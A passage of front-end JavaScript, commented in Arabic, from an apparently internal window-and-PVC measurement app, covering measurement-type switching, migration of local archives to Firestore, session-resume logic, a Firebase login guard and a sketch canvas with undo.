      if(newName.trim() === '') {
        if(confirm('سيتم حذف هذا النوع نهائياً. هل أنت متأكد؟')) deleteCustomTypeById(id);
        return;
      }
      newName = newName.trim();
      const dup = findByName(newName, id);
      if(dup) { alert(`الاسم «${dup.t.name}» مستخدم بالفعل. اختر اسماً مختلفاً.`); return; }
      t.name = newName;
      t.calc = askExtraCalc(t.name, t.calc || 'pvc');
      saveCustomTypes(types);
      updateCustomTypeLabels(t);
      refreshExtraTypeUI();
      renderTable();
      saveCurrentState();
    }

    // تحديث اسم نوع مخصص في كل مكان دون إعادة إنشاء حقول الإدخال (حفاظاً على أي قيم مكتوبة حالياً)
    function updateCustomTypeLabels(t) {
      const btn = document.getElementById('btn_' + t.id);
      if(btn) { const span = btn.querySelector('span:last-child'); if(span) span.innerText = t.name; }
      // النوع قد يكون قسماً مخصصاً (cw_) أو إضافة (xw_) — نجرّب الاثنين
      const wi = document.getElementById('cw_' + t.id) || document.getElementById('xw_' + t.id);
      const hi = document.getElementById('ch_' + t.id) || document.getElementById('xh_' + t.id);
      if(wi) wi.placeholder = 'العرض (' + t.name + ')';
      if(hi) hi.placeholder = 'الارتفاع (' + t.name + ')';
      // اسم النوع فوق مربع اللصق يتغيّر معه (renderBulkPanes يحفظ المكتوب فلا يضيع شيء)
      renderBulkPanes();
      renderCopyButtons();
      renderTable();
    }

    function deleteCustomTypeById(id) {
      deleteTypeDefinitionEverywhere(id);
    }

    function switchBox(type) {
      const defs = getAllTypeDefs();
      // عند التعديل: انقل قيم العرض/الارتفاع تلقائياً بدل مسحها، حتى يعمل تغيير القسم بشكل صحيح
      if(editingIndex > -1) {
        let w = '', h = '';
        defs.forEach(d => {
          const wi = document.getElementById(d.w), hi = document.getElementById(d.h);
          if(wi && wi.value && !w) w = wi.value;
          if(hi && hi.value && !h) h = hi.value;
        });
        defs.forEach(d => {
          const wi = document.getElementById(d.w), hi = document.getElementById(d.h);
          if(wi) wi.value = ''; if(hi) hi.value = '';
        });
        const target = defs.find(d => d.id === type);
        if(target) {
          const wi = document.getElementById(target.w), hi = document.getElementById(target.h);
          if(wi) wi.value = w; if(hi) hi.value = h;
        }
      }

      defs.forEach(d => {
        const box = document.getElementById(boxIdFor(d.id));
        const btn = document.getElementById(btnIdFor(d.id));
        const isActive = d.id === type;
        /* «سرانتي» لم يعد قسماً يُختار: صندوقه لا يُفتح إلا عند تعديل مقاس
           قديم من نوعه (يُستدعى switchBox('seranati') من editRow). */
        /* ⚠️ تغيير 9.1.0 — كل الأنواع تظهر معاً.

           كان يُعرض قسم واحد ويُخفى الباقي، فمن عنده في الشبّاك الواحد
           بيفيسي وألمونيوم وناموسية يتنقّل بين ثلاثة أقسام لكل فتحة —
           والتنقّل نفسه هو ما يُنسي: يملأ قسماً، ينتقل، ينسى أنه ملأ
           الأول، فيضيف مقاساً ناقصاً.

           ومنطق الإضافة كان يدعم المتعدّد أصلاً:
               defs.filter(...).map(buildEntry).filter(Boolean)
           تبني صفاً لكل قسم **معبَّأ**. فالواجهة وحدها كانت تمنع ما
           يسمح به الكود. الآن تُعرض كلها، وتُضاف المعبَّأة منها بضغطة
           واحدة، ويبقى الفارغ فارغاً فلا يُضاف.

           و«سرانتي» يبقى مستثنى كما كان: لم يعد قسماً يُختار، ولا يُفتح
           صندوقه إلا عند تعديل مقاس قديم من نوعه. */
        /* ⚠️ تصحيح 9.2.1 — تراجعٌ عن خطأ أدخلتُه في 9.1.0.

           كنتُ أظهرتُ **كل** صناديق الأنواع معاً استجابةً لطلب «تظهر كل
           الأنواع». وكان ذلك قراءةً خاطئة للواجهة: هذه الصفحة أُعيد
           تصميمها على خانتَي مقاس واحدتين في الأعلى، والأنواع تُختار
           بعلامات ✓ — لا بخانة مقاس لكل نوع.

           فما وقع فعلاً عند من عنده أنواع مخصّصة: تظهر تحت الملاحظة
           خانتا عرض وارتفاع **لكل نوع**. محلٌّ فيه ثلاثة أنواع يرى ثماني
           خانات مقاس في شاشة واحدة، ولا يعرف أيّها المعتمدة — وذلك أسوأ
           من المشكلة التي أردتُ حلّها.

           والطلب الأصلي مستوفى بالكامل من غير هذا: عمود الأنواع ظاهر
           (أُلغي `hidden` عنه في 9.1.0 وهو الإصلاح الحقيقي)، والتأشير
           متعدّد، وضغطة واحدة تُضيف كل ما أُشّر. فالأنواع كلها أمام
           العين، وخانتا المقاس تبقيان اثنتين لا غير. */
        if(box) box.style.display = isActive ? (d.id === 'seranati' ? 'block' : 'grid') : 'none';
        if(!btn) return;
        if(d.id === 'pvc') { btn.classList.toggle('active-pvc', isActive); return; }
        if(d.id === 'seranati') { btn.classList.toggle('active-ser', isActive); return; }
        // الأنواع المخصصة: نطبّق لونها الخاص مباشرة بدل الاعتماد على كلاس CSS ثابت
        const icon = btn.querySelector('.rename-icon');
        if(isActive) {
          /* إصلاح 8.8.5 — d.color من measurementTypes المشتركة التي يكتبها أي عضو.
             و hexToRgba تُعيد rgba(NaN,NaN,NaN,…) لقيمة غير ست عشرية، فتفسد الظل
             بلا خطأ. safeColor تضمن قيمة صالحة في الحالتين. */
          const _dc = safeColor(d.color);
          btn.style.background = _dc; btn.style.color = '#ffffff'; btn.style.boxShadow = `0 6px 18px ${hexToRgba(_dc, 0.3)}`;
          if(icon) { icon.style.background = 'rgba(255,255,255,0.3)'; icon.style.color = '#ffffff'; }
        } else {
          btn.style.background = ''; btn.style.color = ''; btn.style.boxShadow = '';
          if(icon) { icon.style.background = ''; icon.style.color = ''; }
        }
      });
      // ملاحظة: لا نمسح الحقول هنا عند الإضافة العادية، حتى يستطيع المستخدم تعبئة
      // قسم البيفيسي ثم الانتقال للسرانتي (أو أي نوع آخر) وتعبئته أيضاً دون فقدان القيم،
      // ثم إضافتهما معاً للجدول بضغطة واحدة.
      activeType = type;
      applyExtrasVisibility();
    }

    /* ============================================================
       الإضافات السريعة (السرانتي الخارجي / الناموسية / الناموسية المتحركة)
       تخصّ خانة البيفيسي وحدها
       ------------------------------------------------------------
       هذه إضافات تُركَّب على شبّاك بيفيسي بنفس مقاسه، فلا معنى لها مع
       السرانتي أو غيره. وكان العمود يبقى ظاهراً في كل الأقسام، فتُترك
       علامة ✓ من شغلة بيفيسي سابقة ثم يُضاف مقاس سرانتي فتُولَّد معه
       صفوف ناموسية لا وجود لها في الطلب — زيادة صامتة في الفاتورة.
       الآن: العمود يظهر مع البيفيسي فقط، وأي علامة قائمة تُمسح فور
       الانتقال لقسم آخر حتى لا تُطبَّق على نوع لا تخصّه.
       ============================================================ */
    function extrasAllowedFor(type) { return type === 'pvc'; }

    function applyExtrasVisibility() {
      const col = document.getElementById('extrasCol');
      /* 9.1.0 — قسم البيفيسي ظاهر دائماً الآن، فعمود الإضافات يبقى ظاهراً
         معه. وخطر «العلامة المعلّقة» الذي عُولج بإخفائه سابقاً عولج من
         جذره في saveEntry: الإضافات لا تُطبَّق إلا على صفّ بيفيسي. */
      const allowed = true;
      /* removeAttribute لا يكفي عنه style: خاصية hidden في HTML تُطبِّق
         display:none من ورقة أنماط المتصفح، ولا يلغيها إسناد '' لأنه
         يعني «بلا قيمة مضمّنة». نُزيل الخاصية نفسها. */
      if (col) { col.removeAttribute('hidden'); col.removeAttribute('aria-hidden'); col.style.display = ''; }
      if (!allowed && getExtraRepeats().length) {
        // علامات معلّقة من قسم البيفيسي: تُمسح بدل أن تُطبَّق على نوع آخر
        saveExtraRepeats([]);
        try { renderExtraChips(); } catch (e) {}
        try { updateMainActionLabel(); } catch (e) {}
      }
    }

    function initCanvas() {
      _canvasReady = true;
      // حماية: لو عرض الكانفاس صفر عند هذه اللحظة (تأخر بالتخطيط/الرندر لأي سبب)، getImageData كان يرمي خطأً
      // يوقف تنفيذ بقية window.onload بالكامل (يشمل عرض الأرشيف واستعادة الحالة المحفوظة) دون أي رسالة واضحة
      canvas.width = canvas.offsetWidth || canvas.clientWidth || 300;
      canvas.height = 180;
      ctx.lineCap = 'round'; ctx.lineWidth = 5; ctx.strokeStyle = '#000000';
      isCanvasEmpty = true;
      resetCanvasUndo();
    }

    // ترحيل تلقائي لمرة واحدة: أي بيانات قديمة كانت محفوظة تحت "النوع الثالث" الثابت تتحول لنوع مخصص بنفس الاسم
    // حتى لا تُفقد أي مقاسات قديمة كانت مسجّلة بذلك النوع بعد إلغائه
    function migrateOldType3() {
      if(safeGetItem('type3_migrated')) return;
      const oldName = safeGetItem('type3_name');
      // إصلاح 8.8: الترحيل كان يسقط كلياً على قيمة تالفة، فتضيع الأنواع القديمة
      let last = wsParse(safeGetItem('ws_last_state'), null);
      let archives = wsParse(safeGetItem('ws_archives'), []);
      if (!Array.isArray(archives)) archives = [];
      let found = !!(last && last.jobList && last.jobList.some(i => i.type === 'type3'));
      if(!found) found = archives.some(a => a.data && a.data.jobList && a.data.jobList.some(i => i.type === 'type3'));

      if(found || oldName) {
        const types = getCustomTypes();
        const id = wsUid('ctype_');
        types.push({ id, name: oldName || 'نوع ثالث', color: nextCustomTypeColor() });
        saveCustomTypes(types);
        const remap = list => { if(list) list.forEach(i => { if(i.type === 'type3') i.type = id; }); };
        if(last) { remap(last.jobList); safeSetItem('ws_last_state', JSON.stringify(last)); }
        if(archives.length) { archives.forEach(a => remap(a.data && a.data.jobList)); safeSetItem('ws_archives', JSON.stringify(archives)); }
      }
      safeRemoveItem('type3_name');
      safeSetItem('type3_migrated', '1');
    }

    // ترحيل تلقائي لمرة واحدة: أي مقاسات محفوظة سابقاً على هذا الجهاز فقط (قبل ربط الحساب بـ Firestore)
    // تُرفع تلقائياً للأرشيف السحابي المشترك، حتى لا يفقد صاحب العمل سجل أعماله القديم بعد هذا التحديث
    async function migrateLocalArchivesToFirestore() {
      if(safeGetItem('archives_migrated_to_cloud')) return;
      try {
        if (!navigator.onLine || !db || !db.collection) return;
        // لا نرفع كاش هذا المتصفح القديم إذا كان الأرشيف السحابي يحتوي سجلات.
        // هذا يمنع إعادة إحياء زبائن حُذفوا من جهاز آخر أو إنشاء نسخ من كاش قديم.
        const cloudProbe = await db.collection('measurementJobs').limit(1).get({ source: 'server' });
        if (cloudProbe && !cloudProbe.empty) {
          safeSetItem('archives_migrated_to_cloud', '1');
          return;
        }
        let localArchives = JSON.parse(safeGetItem('ws_archives') || '[]');
        if (!Array.isArray(localArchives)) localArchives = [];
        // لا ترحّل عناصر محذوفة أو سجلات بلا بيانات حقيقية.
        localArchives = localArchives.filter(a => a && a.deleted !== true && a.data && typeof a.data === 'object');
        /* ══ ترحيل حيادي ══
           العلامة تُوضع **بعد** الحلقة. فلو انقطع الاتصال في منتصفها لم
           تُوضع، وأُعيد الترحيل عند الفتح التالي — بمعرّفات جديدة، فتظهر
           كل كراسة مرحَّلة مرتين.

           المعرّف الآن مشتق من الكراسة المحلية نفسها (فهرسها واسمها
           ووقتها)، فإعادة الترحيل تكتب فوق نفس المستندات بدل أن تُضيف
           نسخاً. تشغيله عشر مرات يعطي النتيجة نفسها. */
        for(const a of localArchives) {
          const stable = String(a.id || a.localId || (String(a.name || '') + '_' + String(a.savedAt || a.date || '')))
            .replace(/[^\w\u0600-\u06FF-]/g, '').slice(0, 72);
          const id = 'MIG-LEGACY-' + stable;
          await fsSet('measurementJobs', id, {
            label: a.name || 'بدون اسم',
            state: a.data || {},
            createdAt: Date.now(),
            createdByUid: (window.currentShopUser && window.currentShopUser.uid) || '',
            updatedAt: Date.now(),
            updatedBy: (window.currentShopUser && window.currentShopUser.name) || '',
            migratedFromDevice: true
          });
        }
        safeSetItem('archives_migrated_to_cloud', '1');
      } catch(e) { console.error('migrateLocalArchivesToFirestore:', e); }
    }

    function initMeasurementsApp() {
      try { installEditAutoSaveListeners(); } catch(e) {}
      if(!storageAvailable) {
        alert('⚠️ التخزين المحلي غير متاح في هذا المتصفح/التطبيق — لهذا لا تُحفظ المقاسات أو بيانات العميل عند الخروج أو إعادة التحميل. جرّب فتح نفس الرابط من متصفح كروم مباشرة للمقارنة.');
      }
      // كل خطوة تهيئة معزولة بمفردها: فشل أي خطوة (كاللوحة مثلاً) لم يعد يمنع باقي الخطوات
      // (وأهمها عرض الأرشيف واستعادة آخر حالة محفوظة) من التنفيذ كما كان يحدث سابقاً
      try { migrateOldType3(); } catch(e) { console.error('migrateOldType3:', e); }
      /* التهيئة لا تقع هنا بل بعد أول لقطة من السيرفر.
         السبب: جهاز جديد يُثبَّت اليوم ليس عليه علامات التهيئة المحلية،
         فيُنشئ الأنواع الافتراضية ويكتبها فوق القائمة المشتركة —
         فتُمحى أسماء أضافها الزملاء وتعديلاتهم عليها. */
      try { attachExtraTypesSync(); } catch(e) { console.error('attachExtraTypesSync:', e); }
      try { mergeDuplicateTypeNames(); } catch(e) { console.error('mergeDuplicateTypeNames:', e); }
      try { normalizeSharedMeasurementTypes(); } catch(e) { console.error('normalizeSharedMeasurementTypes:', e); }
      try { resetIdleTimer(); } catch(e) { console.error('resetIdleTimer:', e); }
      try { initCanvas(); } catch(e) { console.error('initCanvas:', e); }
      try { renderTypeButtons(); renderCustomTypeBoxes(); renderCopyButtons(); } catch(e) { console.error('renderTypeButtons:', e); }
      try { renderExtraTypeBoxes(); renderExtraChips(); updateMainActionLabel(); } catch(e) { console.error('renderExtras:', e); }
      try { hidePersistentTypeLists(); } catch(e) {}
      try { attachMeasurementJobsSync(); } catch(e) { console.error('attachMeasurementJobsSync:', e); }
      try { attachDebtsSync(); } catch(e) { console.error('attachDebtsSync:', e); }
      try { migrateLocalArchivesToFirestore(); } catch(e) { console.error('migrateLocalArchivesToFirestore:', e); }
      try { attachStoreSync(); } catch(e) { console.error('attachStoreSync:', e); }
      try { migrateLocalPricesToStore(); } catch(e) { console.error('migrateLocalPricesToStore:', e); }
      try { renderPriceTags(); } catch(e) { console.error('renderPriceTags:', e); }
      try {
        /* ══ ماذا نعرض عند فتح التطبيق؟ ══
           ثلاث حالات مختلفة تماماً، وكانت كلها تُعامَل معاملة واحدة:
           تُستعاد الكراسة كما تُركت أياً كانت. فيفتح المستخدم التطبيق
           بعد يوم فيجد مقاسات زبون قديم أمامه.

           1) كراسة **محفوظة** فُتحت للاطّلاع (وضع العرض):
              لا تُستعاد إطلاقاً. هي في الأرشيف سليمة، وإعادتها للشاشة لا
              تفيد شيئاً وتوهم أن هناك عملاً جارياً.

           2) عمل **جارٍ** تُرك قبل أقل من نصف ساعة:
              يُستعاد كما هو — قد يكون التطبيق أُغلق بالخطأ أو انقطع.

           3) عمل جارٍ تُرك قبل نصف ساعة أو أكثر:
              يُؤرشَف فوراً وتُفرَّغ الشاشة، فتُفتح جاهزة لعمل جديد مع
              لافتة استرجاع بضغطة واحدة. */
        const last = safeGetItem('ws_last_state');
        const wasViewOnly = safeGetItem('ws_sheet_viewonly') === '1';
        const savedAt = parseInt(safeGetItem(AUTO_ARCHIVE_KEY) || '0', 10);
        const awayFor = savedAt > 0 ? (Date.now() - savedAt) : 0;

        /* 9.9.29 — عند فتح الصفحة توجد حالتان فقط:
           1) لا توجد جلسة قياسات غير مكتملة: ابدأ كراسة جديدة فوراً.
           2) توجد جلسة غير مكتملة عمرها أقل من نصف ساعة: اعرض اختياراً
              واضحاً بين «بدء جديد» و«استئناف قياسات اسم العميل».

           لا نستخدم اسم العميل لمطابقة كراسة قديمة، ولا نفتح الأرشيف
           تلقائياً. الاستئناف يعيد فقط آخر جلسة محلية غير مكتملة، وإذا
           اختار المستخدم «بدء جديد» يُفصل الارتباط قبل أي كتابة جديدة. */
        try {
          if (archiveSyncTimer) { clearTimeout(archiveSyncTimer); archiveSyncTimer = null; }

          const raw = safeGetItem('ws_last_state');
          const savedAt = parseInt(safeGetItem(AUTO_ARCHIVE_KEY) || '0', 10);
          const awayFor = savedAt > 0 ? (Date.now() - savedAt) : Infinity;
          const savedState = wsParse(raw, null);
          const hadViewOnly = wasViewOnly || safeGetItem('ws_sheet_viewonly') === '1';
          const resumable = !hadViewOnly && savedAt > 0 && awayFor < AUTO_ARCHIVE_MS && hasAnyData(savedState);

          if (resumable) {
            // نعرض الكراسة خلف نافذة الاختيار، لكن لا نربطها بالأرشيف
            // ولا نسمح بالتعديل قبل أن يختار المستخدم الاستئناف.
            currentArchiveIndex = -1;
            const savedArchiveId = safeGetItem('ws_current_archive_id') || '';
            setCurrentArchiveDoc(savedArchiveId || null);
            sheetViewOnly = true;
            _loadingArchive = true;
            try { loadFromJSON(savedState); } finally { _loadingArchive = false; }
            _sheetFingerprint = sheetFingerprint();
            lastMeasurementAt = savedAt;
            try { safeSetItem('ws_sheet_viewonly', '1'); } catch (e) {}
            setSheetViewOnly(true);
            renderTable();
            setTimeout(() => showResumeChoice(savedState.custName || 'بدون اسم'), 80);
          } else {
            // أكثر من نصف ساعة، أو لا توجد جلسة قيد العمل، أو كانت الشاشة
            // تعرض كراسة أرشيفية: لا نستعيد شيئاً. يبدأ العمل من الصفر.
            currentArchiveIndex = -1;
            setCurrentArchiveDoc(null);
            sheetViewOnly = false;
            editingIndex = -1;
            editOpenedAt = 0;
            try {
              safeSetItem('ws_current_archive_id', '');
              safeSetItem('ws_sheet_viewonly', '0');
              safeRemoveItem('ws_last_state');
              safeRemoveItem(AUTO_ARCHIVE_KEY);
            } catch (e) {}
            resetSheetForNextJob('كراسة جديدة — ابدأ مقاسات جديدة');
          }
        } catch (e) {
          console.error('تهيئة جلسة القياسات:', e);
          try {
            currentArchiveIndex = -1;
            setCurrentArchiveDoc(null);
            sheetViewOnly = false;
            safeSetItem('ws_sheet_viewonly', '0');
            safeRemoveItem('ws_last_state');
            safeRemoveItem(AUTO_ARCHIVE_KEY);
            resetSheetForNextJob('كراسة جديدة — ابدأ مقاسات جديدة');
          } catch (_) {}
        }
      } catch(e) { console.error('loadFromJSON:', e); }
      // شبكة أمان: أي حالة أفلتت من الفحص أعلاه تُعالَج بعد ثوانٍ
      setTimeout(() => { try { autoArchiveTick(); } catch (e) { wsSilent('measurements:autoArchive', e); } }, 4000);
      try { applySheetLockUI(); } catch(e) { console.error('applySheetLockUI:', e); }
      try { switchBox('pvc'); } catch(e) { console.error('switchBox:', e); }
      try { applyExtrasVisibility(); } catch(e) { console.error('applyExtrasVisibility:', e); }
      updateShareHeader();
      renderLocationButton();
      try { updateShareHeader(); } catch (e) {}   // رأس الجدول يعرض الموقع أيضاً
    }

    /* ══ عند الخروج من التطبيق ══
       الكراسة المحفوظة المعروضة للاطّلاع تُغلَق فوراً: نمحو علامتها
       وارتباطها فلا تعود عند الفتح التالي. البيانات في الأرشيف سليمة،
       والشرط أن تكون محفوظة فعلاً — ولذلك نتحقق من وضع العرض تحديداً،
       فهو لا يُضبط إلا لكراسة أُخذت من الأرشيف.

       pagehide أوثق من beforeunload على الجوال: الأخير لا يقع أصلاً حين
       يُغلق النظام التطبيق أو يُبدَّل إلى غيره. */
    window.addEventListener('pagehide', function () {
      try {
        if (!sheetViewOnly) return;                       // عمل جارٍ: يبقى كما هو
        safeSetItem('ws_sheet_viewonly', '0');
        safeSetItem('ws_current_archive_id', '');
        safeSetItem('ws_last_state', '{}');
      } catch (e) {}
    });

    // ===== حارس الدخول: يشغّل التطبيق فقط بعد تأكيد جلسة Firebase صالحة =====
    /* ⚠️ 9.8.0 — مستمع الأنواع يُربط بالتوازي لا بالتسلسل.

       كان يُربط داخل guardPage، أي **بعد** أن تكتمل قراءة مستند العضوية
       من Firestore. فسلسلة الانتظار كانت:
           تهيئة التخزين → التحقق من الهوية → قراءة members
           → ثم يبدأ الاستماع للأنواع → ثم تصل أول لقطة
       وكل حلقة منها رحلة شبكة. فالنوع الذي يكتبه زميلك الآن لا تراه إلا
       بعد أن تتمّ رحلتان قبله.

       ولا شيء في الأنواع يعتمد على الرتبة: القاعدة تشترط العضوية وحدها،
       وهي ثابتة لحظةَ تعرف Firebase مَن أنت. فالربط هنا — عند أول إشعار
       بالهوية — يُسقط رحلة `members` من المسار كاملةً.

       وربطُه مرتين لا يضرّ: الدالة تحرس نفسها بـ `if (extraTypesUnsub) return`. */
    try {
      auth.onAuthStateChanged(function (u) {
        if (u) { try { attachExtraTypesSync(); } catch (e) {} }
      });
    } catch (e) {}

    guardPage(function(shopUser) {
      document.getElementById('auth-gate').style.display = 'none';
      document.getElementById('app-nav').style.display = 'flex';
      // الاسم وحده فقط — بلا أي كلمة صفة بجانبه
      document.getElementById('nav-user-badge').textContent = shopUser.name;
      /* 9.5.0 — رابط الفواتير يُكشف للمدير وحده (مخفيّ في الوسم) */
      try {
        const _inv = document.getElementById('nav-invoices');
        if (_inv) { if (isManagerUser()) _inv.removeAttribute('hidden'); else _inv.setAttribute('hidden',''); }
      } catch (e) {}

      initMeasurementsApp();
        }, 'measurements');

    // نظام الرسم
    let canvasUndoStack = []; // مخزون خطوات "تراجع" الخاص باللوحة الصغيرة
    // الصف الذي فُتح رسمه من الجدول؛ -1 يعني أن الرسم يخص المقاس الجديد الجاري إدخاله
    let drawingEditIndex = -1;
    canvas.onmousedown = start; canvas.onmousemove = move; window.onmouseup = endStroke;
    canvas.ontouchstart = start; canvas.ontouchmove = move; canvas.ontouchend = endStroke;
    // حفظ تلقائي فوري أثناء الكتابة في حقول المقاس/اللون/الملاحظات (قبل الضغط على "إضافة للجدول")
    // حتى لا تُفقد أي بيانات مدخلة عند إغلاق الصفحة أو الخروج منها بالخطأ
    document.getElementById('inputSection').addEventListener('input', saveCurrentState);
    document.getElementById('inputSection').addEventListener('input', function () {
      lastDraftTypedAt = Date.now();
    }, { passive: true });
    /* بمجرد أول حرف في خانة المقاس يبدأ البحث عن إشارة GPS في الخلفية،
       فتكون الإحداثيات دقيقة وجاهزة لحظة إضافة المقاس. */
    document.getElementById('inputSection').addEventListener('input', function () {
      try { autoCaptureLocationOnce(); } catch (e) {}
    }, { passive: true });
    document.getElementById('note').addEventListener('input', saveCurrentState);
    function start(e) { ctx.beginPath(); isCanvasEmpty=false; let p=getPos(e); ctx.moveTo(p.x, p.y); canvas.drawing=true; }
    function move(e) { if(!canvas.drawing) return; let p=getPos(e); ctx.lineTo(p.x, p.y); ctx.stroke(); e.preventDefault(); }
    function endStroke() {
      if(canvas.drawing) {
        canvas.drawing=false;
        pushCanvasUndo();
        // إذا كان الرسم تابعاً لصف محفوظ/معدّل، ثبّته فوراً في نفس الصف.
        if (drawingEditIndex > -1 && !isSheetLocked()) {
          const row = jobList[drawingEditIndex];
          if (row) {
            try { row.img = compressSketch(); } catch(e) { row.img = canvas.toDataURL(); }
            row.editedAt = Date.now();
            row.editedBy = currentUserName();
            saveCurrentState();
            renderTable();
          }
        }
      }
    }
    function getPos(e) { let r=canvas.getBoundingClientRect(); return { x: (e.clientX || e.touches[0].clientX) - r.left, y: (e.clientY || e.touches[0].clientY) - r.top }; }

    // يحفظ لقطة من اللوحة الصغيرة كخطوة يمكن الرجوع إليها لاحقاً بـ"تراجع"
    function pushCanvasUndo() {
      canvasUndoStack.push(ctx.getImageData(0, 0, canvas.width, canvas.height));
      if(canvasUndoStack.length > 15) canvasUndoStack.shift();
    }
    // يصفّر مخزون التراجع ويجعل الحالة الحالية نقطة البداية (يُستدعى بعد أي تحميل صورة/مسح وليس بعد كل خط فقط)
    function resetCanvasUndo() {
      canvasUndoStack = [ctx.getImageData(0, 0, canvas.width, canvas.height)];
    }
    function undoCanvas() {
      if(canvasUndoStack.length <= 1) return;
      canvasUndoStack.pop();
      ctx.putImageData(canvasUndoStack[canvasUndoStack.length - 1], 0, 0);
      isCanvasEmpty = canvasUndoStack.length <= 1;
    }

    /* ══ فتح لوحة الرسم ══
       كانت تستدعي initCanvas بلا شرط، وهي تضبط أبعاد اللوحة — وضبط
       canvas.width يمحو محتواها في المتصفح حتى لو كانت القيمة نفسها.
       فيرسم المستخدم، يغلق اللوحة، يفتحها ثانيةً ليراجع رسمه فيجدها
       بيضاء؛ ثم يضيف المقاس فلا يُرفق به رسم لأن isCanvasEmpty عادت true.

       الآن: تُهيَّأ مرة واحدة فقط. وإن كانت مرسومة سلفاً نُبقيها كما هي،
       ونعيد ضبط الأبعاد فقط إن تغيّر عرض الشاشة — وعندها نُعيد رسم
       المحفوظ فوقها فلا يضيع شيء. */
    let _canvasReady = false;

    function openMedia(t) {
      const box = document.getElementById('mediaBox');
      if (box) box.style.display = 'block';

      if (!_canvasReady) { initCanvas(); _canvasReady = true; return; }

      const wantW = canvas.offsetWidth || canvas.clientWidth || 300;
      if (canvas.width === wantW) return;          // لا شيء يستدعي المساس باللوحة

      // تغيّر العرض (دوران الشاشة مثلاً): نحفظ ما رُسم ثم نُعيده بعد الضبط
      const had = !isCanvasEmpty;
      const snap = had ? canvas.toDataURL() : '';
      canvas.width = wantW;
      canvas.height = 180;
      ctx.lineCap = 'round'; ctx.lineWidth = 5; ctx.strokeStyle = '#000000';
      if (had) {
        const im = new Image();
        im.onload = () => { ctx.drawImage(im, 0, 0, canvas.width, canvas.height); resetCanvasUndo(); };
        im.src = snap;
      } else {
        isCanvasEmpty = true;
        resetCanvasUndo();
      }
    }
    function loadImg(i) {
      let r=new FileReader(); r.onload=e=>{
        let img=new Image(); img.onload=()=>{
          ctx.clearRect(0,0,canvas.width,canvas.height);
          ctx.drawImage(img,0,0,canvas.width,canvas.height);
          isCanvasEmpty=false;
          resetCanvasUndo();
        }; img.src=e.target.result;
      }; r.readAsDataURL(i.files[0]);
      document.getElementById('mediaBox').style.display='block';
    }

    // ===== تكبير الرسم: لوحة أكبر بأدوات إضافية (قلم، سهم قياس بالسم، مستطيل، مربع، نص) =====
    let bigCanvas, bigCtx, drawTool = 'pen', bigDrawing = false, shapeStart = null, shapeSnapshot = null;
    let undoStack = [], bigScale = 1, pxPerCm = 4;
    let pendingText = null, movedInGesture = false; // لدعم تثبيت النص بزاوية تتبع اتجاه السحب (تدوير حر لأي اتجاه)
    let labelFontSize = 3; // حجم الخط الأساسي (قبل تحجيمه بمقياس اللوحة) لرقم خط القياس وللنصوص الحرة. صغير جداً افتراضياً حتى لا يؤثر على الرسمة، وقابل للتعديل من الواجهة
    let penWidth = 2; // سمك خط القلم في الرسم الموسّع (قابل للتعديل من الواجهة، من رفيع جداً 1 إلى سميك جداً 20)

    // تكبير/تصغير حجم الخط المستخدم في الأرقام والنصوص فوق اللوحة، ليتمكن المستخدم من الكتابة فوق الخطوط بارتياح
    function changeLabelFontSize(delta) {
      labelFontSize = Math.max(3, Math.min(24, labelFontSize + delta));
      const disp = document.getElementById('labelFontSizeDisplay');
      if(disp) disp.textContent = labelFontSize;
    }

    // تكبير/تصغير سمك خط القلم أثناء الرسم الحر، من رفيع جداً إلى سميك جداً، ويُطبَّق فوراً حتى لو كانت اللوحة مفتوحة بالفعل
    function changePenWidth(delta) {
      penWidth = Math.max(1, Math.min(20, penWidth + delta));
      const disp = document.getElementById('penWidthDisplay');
      if(disp) disp.textContent = penWidth;
      if(bigCtx) bigCtx.lineWidth = penWidth * bigScale;
    }

    // قراءة المقاس الجاهز الذي كتبه المستخدم يدوياً (بالسم) قبل رسم خط القياس، إن وُجد
    function getMeasureValueInput() {
      const el = document.getElementById('measureValueInput');
      if(!el) return null;
      const v = wsNum(el.value, NaN);   // إصلاح 8.8
      return (v && v > 0) ? v : null;
    }

    function ensureBigCanvasReady() {
      if(bigCanvas) return;
      bigCanvas = document.getElementById('bigCanvas'); bigCtx = bigCanvas.getContext('2d');
      bigCanvas.onmousedown = bigStart; bigCanvas.onmousemove = bigMove;
      bigCanvas.ontouchstart = bigStart; bigCanvas.ontouchmove = bigMove; bigCanvas.ontouchend = bigEnd;
      window.addEventListener('mouseup', bigEnd);
    }

    function openBigCanvas() {
      ensureBigCanvasReady();
      document.getElementById('bigDrawModal').style.display = 'flex';
      document.body.style.overflow = 'hidden'; // نمنع تمرير الصفحة خلف اللوحة الموسّعة حتى تملأ شاشة الهاتف تماماً بلا قفز أو تمرير غير مرغوب
      requestAnimationFrame(() => {
        bigCanvas.width = bigCanvas.offsetWidth; bigCanvas.height = bigCanvas.offsetHeight;
        bigScale = bigCanvas.height / 180; pxPerCm = bigCanvas.width / 700; // نجعل عرض اللوحة الكبيرة يمثل حتى 700 سم كمرجع لقياس الخط
        bigCtx.lineCap = 'round'; bigCtx.lineJoin = 'round'; bigCtx.direction = 'rtl';
        bigCtx.lineWidth = penWidth * bigScale; bigCtx.strokeStyle = '#000000'; bigCtx.fillStyle = '#000000';
        bigCtx.font = `bold ${Math.round(labelFontSize * bigScale)}px Tajawal, sans-serif`;
        undoStack = [];
        const ready = () => { pushUndo(); setDrawTool('pen'); };
        if(!isCanvasEmpty) {
          let img = new Image();
          img.onload = () => { bigCtx.drawImage(img, 0, 0, bigCanvas.width, bigCanvas.height); ready(); };
          img.src = canvas.toDataURL();
        } else { bigCtx.clearRect(0, 0, bigCanvas.width, bigCanvas.height); ready(); }
      });
    }

    function closeBigCanvas(save) {
      if(!save && undoStack.length > 1 && !confirm('هل تريد الخروج دون حفظ التعديلات على الرسم؟')) return;
      if(save) {
        if (isSheetLocked()) {
          showMiniToast('🔒 الكراسة محفوظة. اضغط «تعديل وإضافة مقاسات» تحت الجدول أولاً.', '#16477f');
          return;
        }
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.drawImage(bigCanvas, 0, 0, canvas.width, canvas.height);
        isCanvasEmpty = false;
        resetCanvasUndo();
        document.getElementById('mediaBox').style.display = 'block';

        // عند فتح الرسم من صف في الجدول، الحفظ يجب أن يذهب إلى ذلك الصف فوراً؛
        // لا يكفي تحديث اللوحة الصغيرة لأن saveEntry لا يُستدعى بعد ذلك.
        if (drawingEditIndex > -1) {
          const row = jobList[drawingEditIndex];
          if (row) {
            try { row.img = compressSketch(); } catch(e) { row.img = canvas.toDataURL(); }
            row.editedAt = Date.now();
            row.editedBy = currentUserName();
            saveCurrentState();
            renderTable();
